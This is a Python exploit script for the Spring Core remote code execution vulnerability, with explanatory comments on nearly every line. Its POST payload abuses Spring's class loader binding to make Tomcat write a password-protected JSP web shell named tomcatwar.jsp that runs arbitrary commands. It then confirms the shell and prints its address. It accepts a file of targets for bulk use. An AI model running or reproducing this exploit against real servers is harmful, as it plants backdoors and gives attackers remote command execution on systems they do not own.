#!/usr/bin/env python3
#coding:utf-8

import requests
import argparse
from urllib.parse import urljoin

# These lines import libraries that the script will use:
# 'requests': to send HTTP requests to web servers
# 'argparse': to handle command-line arguments
# 'urljoin': to construct URLs by combining parts

def Exploit(url):

# Defines a function named 'Exploit' that takes a single argument 'url'

    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }

# Sets up the HTTP headers for the request. These headers include custom values that the script will use to exploit a vulnerability

    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

# Defines the data to send in the POST request. This data is designed to exploit a security flaw, enabling the attacker to run commands on the server

    try:

# Begins a block of code that will handle any errors that might occur

        go = requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)

# Sends a POST request to the specified url with the given headers and data. timeout=15 means it will wait up to 15 seconds for a response 
# allow_redirects=False means it will not follow redirects, and verify=False disables SSL certificate verification

        shellurl = urljoin(url, 'tomcatwar.jsp')

# Constructs a URL for the potential shell file (i.e., a file that can be used to control the server)

        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)

# Sends a GET request to the constructed URL to check if the shell file was created successfully

        if shellgo.status_code == 200:
            print(f"漏洞存在，shell地址为:{shellurl}?pwd=j&cmd=whoami")

# Checks if the response status code is 200 (which means the file was found and is accessible). If so, it prints a message indicating the existence of the vulnerability and provides the URL where the shell can be accessed

    except Exception as e:
        print(e)
        pass

# Catches any errors that occur during the process and prints the error message


def main():

# Defines the main function, which is the entry point of the script

    parser = argparse.ArgumentParser(description='Srping-Core Rce.')

# Creates a new argument parser with a description for the script

    parser.add_argument('--file',help='url file',required=False)
    parser.add_argument('--url',help='target url',required=False)

# Adds two optional command-line arguments:
# '--file': a file containing URLs
# '--url': a single url

    args = parser.parse_args()

# Parses the command-line arguments and stores them in the args variable

    if args.url:
        Exploit(args.url)

# If the --url argument is provided, calls the Exploit function with the specified URL

    if args.file:
        with open (args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)

# If the --file argument is provided, reads each URL from the file and calls the Exploit function for each URL

if __name__ == '__main__':
    main()

# This line ensures that the main function is executed when the script is run directly (not when imported as a module)
